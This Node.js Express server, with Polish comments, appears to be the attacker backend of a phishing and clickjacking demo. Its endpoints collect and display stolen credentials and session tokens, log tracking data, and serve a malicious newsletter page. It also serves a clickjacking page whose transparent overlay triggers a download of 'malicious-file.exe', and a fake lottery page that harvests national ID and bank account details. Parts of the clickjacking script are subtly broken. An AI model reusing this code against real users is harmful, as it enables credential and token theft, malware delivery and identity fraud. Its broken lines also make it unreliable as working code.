const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const port = process.env.PORT || 3000;
const cors = require("cors");

const userTokenFilename = "./user-tokens.json";
const trackUserFilename = "./public/track-user.json";

// Middleware do parsowania JSON

// app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
// Serwowanie statycznych plików z katalogu 'public'
app.use(express.static(path.join(__dirname, "public")));
app.use(express.json());
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*"); // Pozwala na dostęp z każdej domeny
  res.setHeader(
    "Access-Control-Allow-Methods",
    "GET, POST, PUT, DELETE, OPTIONS"
  ); // Pozwala na te metody HTTP
  res.setHeader("Access-Control-Allow-Headers", "*"); // Pozwala na te nagłówki

  // Obsługa zapytań OPTIONS (pre-flight request)
  if (req.method === "OPTIONS") {
    return res.sendStatus(204); // No Content
  }

  next();
});
app.use(cors());
app.get("/", (req, res) => {
  res.send("Hello World!");
});

app.get("/malicious-newsletter", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "malicious-newsletter.html"));
});
// app.get("/send-user-data", (req, res) => {
//   const filePath = path.join(__dirname, "send-user-data.js");
//   fs.readFile(filePath, "utf8", (err, data) => {
//     if (err) {
//       res.status(500).send("Błąd serwera");
//       return;
//     }
//     res.setHeader("Content-Type", "application/javascript");
//     res.send(data);
//   });
// });

app.post("/send-user-credentials", (req, res) => {
  const data = req.body;
  console.log(data);
  fs.writeFile("data.json", JSON.stringify(data, null, 2), (err) => {
    if (err) {
      return res.status(500).send("Error writing to file");
    }
    res.send("Data saved successfully");
  });
});

app.get("/read-user-credentials", (req, res) => {
  fs.readFile("data.json", "utf8", (err, data) => {
    if (err) {
      return res.status(500).send("Error reading from file");
    }
    const userCredentails = JSON.parse(data);
    res.send(`
      <div>User credentials: 
      <p>password: ${userCredentails.password}</p>
      <p>email: ${userCredentails.email}</p>
      </div>`);
  });
});

app.post("/track-user", (req, res) => {
  console.log(req.body);
  const data = req.body;
  const logEntry = `${JSON.stringify(data)}\n`;
  const filePath = path.join(__dirname, "public", "track-user.json");

  fs.readFile(filePath, "utf8", (err, fileData) => {
    if (err && err.code !== "ENOENT") {
      console.error("Błąd podczas odczytu pliku:", err);
      return res.status(500).send("Błąd serwera");
    }

    let jsonArray = [];

    if (fileData) {
      try {
        jsonArray = JSON.parse(fileData);
      } catch (parseError) {
        console.error("Błąd podczas parsowania JSON:", parseError);
        return res.status(500).send("Błąd parsowania danych");
      }
    }

    jsonArray.push(data);

    fs.writeFile(filePath, JSON.stringify(jsonArray, null, 2), (writeErr) => {
      if (writeErr) {
        console.error("Błąd podczas zapisywania do pliku:", writeErr);
        return res.status(500).send("Błąd serwera");
      }

      console.log("Dane zostały zapisane do pliku w folderze public");
      res.status(200).send("Dane zostały zapisane");
    });
  });
});

app.post("/user-token", (req, res) => {
  console.log(req.body);
  const userToken = req.body.userToken;
  fs.writeFile(userTokenFilename, JSON.stringify(userToken, null, 2), (err) => {
    if (err) {
      return res.status(500).send("Error writing to file");
    }
    // res.send("Data saved successfully");
  });
});

app.get("/user-token", (req, res) => {
  fs.readFile(userTokenFilename, "utf8", (err, data) => {
    if (err) {
      return res.status(500).send("Error reading from file");
    }
    res.send(`
      <h1>Token zaatakowanego użytkownika: </h1>
      <div style="
        text-wrap: wrap;
        width: 400px;
        overflow-wrap: break-word;
        margin-top: 15px
      ">${JSON.parse(data)}
      </div>
      `);
  });
});

app.get("/download-file", (req, res) => {
  res.send(`
    <style>
    @font-face {
      font-family: "Mitr-Medium";
      src: url("/fonts/Mitr-Medium.ttf");
    }

    .download-wrapper {
      display: inline-flex;
      align-items: center;
      justify-content: flex-start;
      font-family: "Mitr-Medium";
      width: 100%;
      color: white;
    }

    .button {
      background-color: #c15303;
      padding: 8px 10px;
      font-size: 14px;
      border-radius: 5px;
      border: none;
      width: 200px;
      font-family: "Mitr-Medium";
      margin-right: 15px;
    }
    </style>
    <div class="download-wrapper">
      <button class="button">Pobierz film</button>
      <p>Kliknij w przycisk, aby pobrać film</p>
    </div>
    `);
});

app.get("/clickjacking", (req, res) => {
  res.send(`
    <style>
    iframe {
      position: relative;
    }
    a {
      position: absolute;
      width: 100vw;
      height: 100vh;
      background: transparent;
      z-index: 1
    }
    </style>

    <a href="/malicious-file.exe" download="malicious-file.exe" id="a" ></a>
    <iframe style="width: 100%; height:100%" src="https:localhost:5001" />
    
    <script>
      const iframe = document.getElementByTagName('iframe');
      iframe.addEventListener('click', () => {
        document.getElementById('a').click();
      })
    </script>
    `);
});

app.get("/lottery-attack", (req, res) => {
  res.send(`
    <h1>Gratulacje!</h1>
    <h2>Wygrałeś 100.000 zł!!!</h2>
    Podaj swoje dane, abyśmy mogli przelać Ci wygrane pieniądze:
    <div>
    <p>Imię:</p>
    <input/>
    <p>Nazwisko:</p>
    <input/>
    <p>PESEL:</p>
    <input/>
    <p>Numer telefonu:</p>
    <input/>
    <p>Numer konta bankowego</p>
    <input/>
    <div>
    <button style="margin-top: 20px">Wyślij</button>
    </div>
    </div>
    `);
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
